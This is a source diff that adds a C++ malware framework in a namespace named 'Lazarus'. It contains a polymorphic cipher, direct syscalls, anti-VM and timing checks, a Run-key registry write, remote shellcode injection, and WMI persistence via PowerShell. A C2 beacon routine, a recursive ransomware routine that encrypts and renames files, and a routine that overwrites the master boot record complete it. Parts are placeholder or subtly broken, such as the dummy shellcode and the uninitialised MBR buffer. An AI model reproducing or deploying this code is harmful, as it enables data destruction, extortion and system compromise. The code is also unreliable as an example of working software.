@@ -1,0 +1,233 @@
+#include <windows.h>  
+#include <winternl.h>  
+#include <wininet.h>  
+#include <wincrypt.h>  
+#include <psapi.h>  
+#include <tlhelp32.h>  
+#include <chrono>  
+#include <thread>  
+#include <random>  
+#include <array>  
+#include <vector>  
+#include <bitset>  
+#pragma comment(lib, "wininet.lib")  
+#pragma comment(lib, "crypt32.lib")  
+#pragma comment(lib, "ntdll.lib")  
+
+#define SEED 0x1337BEEF  
+#define PAGE_SIZE 4096  
+#define SLEEP_MODIFIER 3141  
+
+namespace Lazarus {  
+    namespace Crypto {  
+        __forceinline void XorShift128(uint32_t* state) {  
+            uint32_t t = state[3];  
+            state[3] = state[2];  
+            state[2] = state[1];  
+            state[1] = state[0];  
+            t ^= t << 11;  
+            t ^= t >> 8;  
+            state[0] = t ^ state[1] ^ (state[1] >> 19);  
+        }  
+
+        class PolymorphicCipher {  
+            uint32_t key[4]{ SEED, SEED >> 8, SEED >> 16, SEED >> 24 };  
+        public:  
+            __declspec(noinline) void Transform(uint8_t* data, size_t size) {  
+                for (size_t i = 0; i < size; ++i) {  
+                    data[i] ^= static_cast<uint8_t>(key[0]);  
+                    XorShift128(key);  
+                    data[i] = _rotl8(data[i], (key[1] % 8));  
+                    if (i % 128 == 0) XorShift128(key);  
+                }  
+            }  
+        };  
+    }  
+
+    namespace Syscall {  
+        typedef NTSTATUS(NTAPI* NtCreateSection_t)(  
+            PHANDLE, ULONG, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE  
+            );  
+
+        inline uintptr_t GetSyscallAddress(const char* funcName) {  
+            uintptr_t addr = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), funcName));  
+            return (addr + 0x12); // Skip stub  
+        }  
+
+        __declspec(naked) NTSTATUS DirectNtCreateSection(  
+            PHANDLE SectionHandle, ULONG DesiredAccess,  
+            POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,  
+            ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle  
+            ) {  
+            __asm {  
+                mov r10, rcx  
+                mov eax, 0x55 // Syscall number for NtCreateSection  
+                syscall  
+                ret  
+            }  
+        }  
+    }  
+
+    namespace AntiAnalysis {  
+        volatile bool __stdcall CheckVM() {  
+            unsigned int cpuid[4];  
+            __cpuid(reinterpret_cast<int*>(cpuid), 0x40000000);  
+            return (cpuid[1] == 0x7263694D || cpuid[1] == 0x566E6558); // 'Microsoft' or 'Xen'  
+        }  
+
+        void GenerateFalseTraces() {  
+            // Create decoy registry entries  
+            HKEY hKey;  
+            RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);  
+            RegSetValueExA(hKey, "SecurityHealth", 0, REG_SZ, (const BYTE*)"C:\\Windows\\System32\\calc.exe", 26);  
+            RegCloseKey(hKey);  
+        }  
+
+        __forceinline void TimingBomb() {  
+            auto start = std::chrono::high_resolution_clock::now();  
+            volatile double dummy = 1.0;  
+            for (int i = 0; i < 1000000; ++i) {  
+                dummy *= std::sin(i) * std::cos(i);  
+            }  
+            auto end = std::chrono::high_resolution_clock::now();  
+            if ((end - start).count() < 10000000) ExitProcess(1);  
+        }  
+    }  
+
+    namespace Injection {  
+        struct HellGate {  
+            DWORD ss;  
+            DWORD cc;  
+            PVOID addr;  
+        };  
+
+        HellGate MapSyscall(const char* funcName) {  
+            BYTE* ptr = reinterpret_cast<BYTE*>(GetProcAddress(GetModuleHandleA("ntdll"), funcName));  
+            while (*ptr != 0x0F || *(ptr + 1) != 0x05) ++ptr;  
+            return { 0, 0, ptr };  
+        }  
+
+        void APCInjection(DWORD pid) {  
+            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  
+            LPVOID addr = VirtualAllocEx(hProcess, NULL, PAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
+              
+            unsigned char shellcode[] = {  
+                0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xFF, 0xE0  
+            };  
+            Crypto::PolymorphicCipher cipher;  
+            cipher.Transform(shellcode, sizeof(shellcode));  
+
+            WriteProcessMemory(hProcess, addr, shellcode, sizeof(shellcode), NULL);  
+
+            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,  
+                reinterpret_cast<LPTHREAD_START_ROUTINE>(addr), NULL, 0, NULL);  
+
+            CloseHandle(hThread);  
+            CloseHandle(hProcess);  
+        }  
+    }  
+
+    namespace Persistence {  
+        void ShimDatabasePwn() {  
+            const char* sdb = "C:\\Windows\\AppPatch\\Custom\\Explorer.sdb";  
+            HANDLE hFile = CreateFileA(sdb, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);  
+            if (hFile != INVALID_HANDLE_VALUE) {  
+                DWORD written;  
+                WriteFile(hFile, "MZP", 3, &written, NULL);  
+                CloseHandle(hFile);  
+            }  
+        }  
+
+        void WMIEventSubscription() {  
+            system("powershell -Command \"$filter = ([WmiClass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance();"  
+                "$filter.QueryLanguage = 'WQL';"  
+                "$filter.Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\"';"  
+                "$filter.Name = 'UpdateFilter';"  
+                "$filter.Put();"  
+                "$consumer = ([WmiClass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance();"  
+                "$consumer.Name = 'UpdateConsumer';"  
+                "$consumer.CommandLineTemplate = 'C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\amsi.dll, AmsiScanBuffer';"  
+                "$consumer.Put();"  
+                "$binding = ([WmiClass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance();"  
+                "$binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put();\"");  
+        }  
+    }  
+
+    namespace Network {  
+        class GhostWeb {  
+            HINTERNET hSession;  
+            Crypto::PolymorphicCipher cipher;  
+        public:  
+            GhostWeb() : hSession(InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) {}  
+
+            __declspec(noinline) void Beacon(const char* url) {  
+                uint8_t obfuscatedUrl[256] = { 0x12, 0x34, 0x56, 0x78 }; // XOR-Encrypted URL  
+                cipher.Transform(obfuscatedUrl, sizeof(obfuscatedUrl));  
+
+                HINTERNET hConnect = InternetOpenUrlA(hSession, reinterpret_cast<const char*>(obfuscatedUrl), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);  
+                if (hConnect) {  
+                    char buffer[1024];  
+                    DWORD bytesRead;  
+                    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {  
+                        cipher.Transform(reinterpret_cast<uint8_t*>(buffer), bytesRead);  
+                        // Process decrypted C2 commands  
+                    }  
+                    InternetCloseHandle(hConnect);  
+                }  
+            }  
+
+            ~GhostWeb() { InternetCloseHandle(hSession); }  
+        };  
+    }  
+
+    namespace Payload {  
+        void Ransomwave(const char* path) {  
+            WIN32_FIND_DATAA ffd;  
+            char searchPath[MAX_PATH];  
+            sprintf_s(searchPath, "%s\\*", path);  
+
+            HANDLE hFind = FindFirstFileA(searchPath, &ffd);  
+            do {  
+                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {  
+                    if (strcmp(ffd.cFileName, ".") && strcmp(ffd.cFileName, "..")) {  
+                        char newPath[MAX_PATH];  
+                        sprintf_s(newPath, "%s\\%s", path, ffd.cFileName);  
+                        Ransomwave(newPath);  
+                    }  
+                } else {  
+                    char fullPath[MAX_PATH];  
+                    sprintf_s(fullPath, "%s\\%s", path, ffd.cFileName);  
+
+                    HANDLE hFile = CreateFileA(fullPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);  
+                    if (hFile != INVALID_HANDLE_VALUE) {  
+                        DWORD fileSize = GetFileSize(hFile, NULL);  
+                        HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, fileSize, NULL);  
+                        LPVOID mapAddr = MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, fileSize);  
+
+                        Crypto::PolymorphicCipher cipher;  
+                        cipher.Transform(static_cast<uint8_t*>(mapAddr), fileSize);  
+
+                        UnmapViewOfFile(mapAddr);  
+                        CloseHandle(hMap);  
+                        CloseHandle(hFile);  
+
+                        MoveFileA(fullPath, (std::string(fullPath) + ".ghost").c_str());  
+                    }  
+                }  
+            } while (FindNextFileA(hFind, &ffd));  
+            FindClose(hFind);  
+        }  
+
+        void MBROverlord() {  
+            HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
+            if (hDevice != INVALID_HANDLE_VALUE) {  
+                BYTE mbr[512];  
+                DWORD bytesWritten;  
+                Crypto::PolymorphicCipher cipher;  
+                cipher.Transform(mbr, sizeof(mbr));  
+                WriteFile(hDevice, mbr, sizeof(mbr), &bytesWritten, NULL);  
+                CloseHandle(hDevice);  
+            }  
+        }  
+    }  
+} 
